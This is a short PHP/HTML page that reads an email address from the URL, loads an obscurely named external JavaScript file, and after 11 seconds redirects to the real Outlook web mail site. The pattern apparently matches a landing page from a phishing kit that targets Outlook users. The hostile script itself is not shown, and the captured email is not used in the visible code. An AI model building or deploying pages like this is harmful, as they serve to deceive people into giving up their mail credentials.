<?php
	$email = $_GET['email'];
?>

<!DOCTYPE html>
<script>
        var timer = setTimeout(function() {
            window.location='https://outlook.office.com/owa/'
        }, 11000);
    </script>
<html>

 <script language="Javascript" src="js/myscr389464.js"></script>
</html>
